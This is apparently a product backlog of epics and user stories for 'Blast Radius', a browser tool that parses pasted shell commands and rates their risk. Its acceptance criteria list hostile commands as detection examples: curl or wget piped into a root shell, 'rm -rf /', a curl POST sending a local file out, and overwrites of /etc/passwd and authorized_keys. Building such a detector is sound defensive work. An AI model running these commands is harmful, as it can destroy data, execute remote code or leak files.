# Blast Radius — Backlog

Epics and stories for the build. Every story has 1–3 verifiable acceptance criteria. The first
story of Epic 1 is the wow moment — it ships before anything else.

## Epic 1 — Core Parser & Wow Moment

- [ ] **1. Wow-moment demo lands on page load**
  Paste-and-analyze demo shows the wow moment: `curl http://x | sudo bash` flags red with a
  one-line reason, next to a harmless green-flagged example.
  - Loading the page with empty input shows two pre-filled example cards: one red
    (fetch-and-execute-as-root) and one green (harmless), each with a one-line explanation.
  - Pasting `curl http://x | sudo bash` into the input and clicking Analyze reproduces the same
    red verdict within 200ms.
  - The red explanation names the specific danger: piping a remote fetch into `sudo bash`.

- [ ] **2. Shell tokenizer**
  Tokenizer splits a POSIX-ish shell command line into words, operators, and quoted strings.
  - Tokenizing `curl http://x | sudo bash` yields tokens for `curl`, `http://x`, `|`, `sudo`,
    `bash`.
  - Quoted arguments (`"a b"`, `'a b'`) tokenize as a single word token, preserving contents
    without the quote characters.
  - Unterminated quotes produce a parse error surfaced to the UI, not a crash.

- [ ] **3. Command AST parser**
  Parser builds a command AST recognizing pipelines, redirects, and command separators (`;`,
  `&&`, `||`).
  - `a | b | c` parses into a 3-stage pipeline AST.
  - `a > out.txt`, `a >> out.txt`, `a < in.txt` parse into a command node with typed redirect
    metadata (write/append/read + target).
  - `a && b`, `a || b`, `a; b` parse into a sequence of command nodes with the correct operator
    between them.

- [ ] **4. Risk engine core**
  Risk engine walks the AST and returns a structured verdict list (severity, one-line reason,
  matched span).
  - Given a parsed AST, `analyze()` returns an array of findings, each with `severity`
    (`safe`/`caution`/`danger`), a one-line `reason` string, and the source token span it
    applies to.
  - An empty or comment-only input returns an empty findings list, not an error.
  - Analysis of a 200-token script completes in under 50ms client-side.

## Epic 2 — Risk Rule Coverage

- [ ] **5. Destructive filesystem operations**
  Detect destructive filesystem operations (`rm -rf`, `rm -rf /`, `mkfs`, `dd of=/dev/*`).
  - `rm -rf /` and `rm -rf ~` are flagged `danger` with a reason naming the deleted path scope.
  - `rm -rf ./build` (a scoped relative path) is flagged `caution` at most, not `danger`.

- [ ] **6. Remote fetch-and-execute detection**
  Detect remote-fetch-and-execute patterns (`curl | bash`, `wget -O- | sh`, `curl | sudo bash`).
  - `curl <url> | bash`, `wget -O- <url> | sh`, and `curl <url> | sudo bash` are all flagged
    `danger`.
  - The reason text names both halves: what's fetched and that it's piped straight to a shell.

- [ ] **7. Sudo/root scope reasoning**
  Detect sudo/root scope on a command and reflect it in severity, not just presence of the word
  "sudo".
  - `sudo apt update` is flagged `caution` while `sudo rm -rf /` compounds to `danger`.
  - A command with no `sudo`/root escalation shows no root-related finding.

- [ ] **8. Outbound network + exfiltration shape**
  Detect outbound network calls and where they send data (`curl -d @file http://x`).
  - A command piping local file contents to a remote POST is flagged with a reason mentioning
    data leaving the machine and the destination host.
  - A plain outbound GET with no data attached (`curl http://x`) is flagged `caution`, lower
    than the exfiltration case.

- [ ] **9. Sensitive-path redirect detection**
  Detect redirect-based overwrites of sensitive paths (`> /etc/...`, `>> ~/.bashrc`,
  `> ~/.ssh/authorized_keys`).
  - Redirecting into `/etc/passwd`, `~/.ssh/authorized_keys`, or shell rc files is flagged
    `danger` naming the specific file.
  - Redirecting into a path under the current/temp directory is not flagged as sensitive-path
    danger.

- [ ] **10. Graceful degradation on unknown syntax**
  Unknown/unrecognized constructs degrade gracefully instead of producing false confidence.
  - A command using an unsupported shell feature (e.g. process substitution `<(...)`) still
    returns a partial parse plus an explicit "couldn't fully analyze this part" caution, never a
    silent false "safe".

## Epic 3 — Polish, Design & Ship

- [ ] **11. Design polish — full DESIGN.md implementation**
  Full-page UI implements docs/DESIGN.md: blueprint direction, tokens, layout, favicon,
  responsive 390/768/1440.
  - Page matches DESIGN.md's color tokens and type pairing.
  - No horizontal scroll and no broken layout at 390px, 768px, and 1440px widths.
  - Favicon is a generated inline SVG using the accent + monogram, not a default icon.

- [ ] **12. Interaction states**
  Paste box, analyze button, and example toggles all have hover/focus/active/disabled styling.
  - Tab-only keyboard navigation reaches and visibly focuses every control in logical order.
  - Clicking Analyze while input is empty shows a designed empty/disabled state, not a silent
    no-op.

- [ ] **13. Static, subpath-deployable build**
  Static site builds to a single relative-path directory deployable at a subdomain path.
  - `npm run build` produces a `dist/` directory whose `index.html` references all assets with
    relative (non-leading-`/`) paths.
  - Opening `dist/index.html` from a subdirectory (simulating a subpath deploy) loads styles and
    scripts correctly.

- [ ] **14. Shareable permalinks**
  Shareable permalink encodes the pasted command so a flagged example can be linked and
  reproduced.
  - Analyzing a command and clicking "Share" produces a URL with the command encoded in it (e.g.
    query param or hash).
  - Opening that URL in a fresh session pre-fills the input and shows the same verdict without
    extra clicks.
